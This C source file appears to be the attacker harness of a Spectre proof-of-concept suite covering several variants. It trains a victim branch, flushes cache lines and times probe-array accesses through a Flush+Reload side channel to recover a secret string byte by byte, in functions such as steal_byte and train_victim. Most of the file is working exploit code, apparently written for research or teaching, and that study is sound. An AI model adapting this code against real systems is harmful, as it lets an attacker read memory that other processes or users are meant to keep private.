#include "spectre_helper.h"
#include "fnr_helper.h"
#include <stdint.h>
#include <stdio.h>

uint8_t array[256 * 4096];
uint8_t temp = 0;
int bufferSize = 16;
int bufferSizeMask = 0x0f;

// TODO
// If we declare buffer size as 16 instead of 160, it works, but with lower resolution
// WHY?
uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
// TODO
// If the secret is short, like below, Spectre won't work! WHY?
// char secret[] = "It's the secret.";
// unreachable but known address
char secret[] = "The Magic Words are Squeamish Ossifrage.";

#ifdef __SPECTRE__V9
int one = 1;
int zero = 0;
int* x_is_safe = &one;
int* x_is_unsafe = &zero;
#endif

/**
 * Finds cached entry of the array
 * Iterates over 256 entries to find latencies smaller than threshold
 */
void find_cached_index(int* scores){

	uint64_t time_dif;
	#ifdef __SPECTRE__V8
	// Because we are always accessing to the 0th element of the buffer
	// in the speculative execution.
	// buffer[0] = 1. Thats why start from 2nd index of the array
	int i = 2;
	#else
	int i = 0;
	#endif
	for(; i < 256; i++){
		time_dif = 0;
		//printf("i:%d\n",i);
		measure_time(time_dif, &array[i * 4096]);

		if(time_dif < CACHE_HIT_THRESHOLD){
			scores[i]++;
		}
	}
}


/**
 * Finds highest score in the scores array
 */
void find_highest_score(int* scores){
	int maxScore = 0;
	int maxIndex = 0;
	for (int i = 1; i < 256; i++){
		if(scores[i] > maxScore){
			maxIndex = i;
			maxScore = scores[i];
		}
	}
	printf("Letter: %c\t Index: %d\t number of hits:%d\n", maxIndex, maxIndex, maxScore);
}


void train_victim(){
	#ifdef __SPECTRE__V7
	size_t* x;
	#endif
	#ifdef __SPECTRE__V15
	size_t* x;
	size_t a = 5;
	x = &a;
	#endif

	for (int i = 0; i < 20; i++){
		
		#ifdef __SPECTRE__V7
		x = victim_function(0);
		#elif __SPECTRE__V9
		victim_function(i % 10, x_is_safe);
		#elif __SPECTRE__V10
		// added this else if statement 
		// so the compiler stop complaining
		//victim_function(0, 1);
		int x2 = 0;
		#elif __SPECTRE__V11
		victim_function(0);
		#elif __SPECTRE__V12
		victim_function(0, 1);
		#elif __SPECTRE__V15
		a = (a % 10);
		a++;
		victim_function(x);
		#else
		victim_function(i % 10);
		#endif
		
		clflush_array(array);
		clflush(&bufferSize);
		
		#ifdef __SPECTRE__v6
		clflush(&bufferSizeMask); // used for v6
		#endif
		
		#ifdef __SPECTRE__V7
		clflush(x);
		#endif

		#ifdef __SPECTRE__V9
		clflush(x_is_safe);
		clflush(x_is_unsafe);
		clflush(&one);
		clflush(&zero);
		#endif
	}
	asm volatile("lfence\n");
	clflush_array(array);
	clflush(&bufferSize);
	
	#ifdef __SPECTRE__v6
	clflush(&bufferSizeMask); // used for v6
	#endif
		
	#ifdef __SPECTRE__V7
	clflush(x);
	#endif
	
	#ifdef __SPECTRE__V9
	clflush(x_is_safe);
	clflush(x_is_unsafe);
	clflush(&one);
	clflush(&zero);
	#endif	
}

#ifdef __SPECTRE__V10
void steal_byte(int* scores, int larger_x){
	uint64_t time_dif;
	
	for(int it = 0; it < 100; it++){

		for(uint8_t tryindex = 32; tryindex < 122; tryindex++){
		
			// train with buffer[0] = 1 
			for(int i = 0; i < 20; i++){
				victim_function(0, 1);
				// added this line to train branch with 50% accuracy
				victim_function(0, 2);
			}
			clflush(&array[3 * 4096]);
			clflush(&bufferSize);
			asm volatile("lfence\n");
			asm volatile("mfence\n");

			// buffer is in the cache
			// x will be in the cache
			// k is in the cache
			// only outer if will be speculatively executed	
			victim_function(larger_x, tryindex);

			// find the cached index
			time_dif = 0;
			// if this line is cached
			// buffer[x] = k or tryindex. We have found the character
			measure_time(time_dif, &array[3 * 4096]);

			if(time_dif < (CACHE_HIT_THRESHOLD)){
				//printf("hit \t tryindex:%d \t tryindex:%c \t time_dif:%ld\n", tryindex, tryindex, time_dif);
				// found the cached index
				scores[tryindex]++;
			}	
		}
	}
	find_highest_score(scores);
}
#else
void steal_byte(int* scores, int larger_x){
	// do the experiment 1000 Times
	for(int it = 0; it < 1000; it++){
		train_victim();	
		// access to the array speculatively
		#ifdef __SPECTRE__V9
		victim_function(larger_x, x_is_unsafe);
		#elif __SPECTRE__V11
		victim_function(larger_x);
		#elif __SPECTRE__V12
		victim_function(larger_x, 0);
		#elif __SPECTRE__V14
		// invert bits in here. They will be reinverted in the victim func.
		victim_function(larger_x ^ 255);
		#elif __SPECTRE__V15
		size_t sizet_largerx = (size_t) larger_x;
		size_t *x = &sizet_largerx;
		victim_function(x);
		#else
		victim_function(larger_x);
		#endif

		find_cached_index(scores);
	}
	find_highest_score(scores);
}
#endif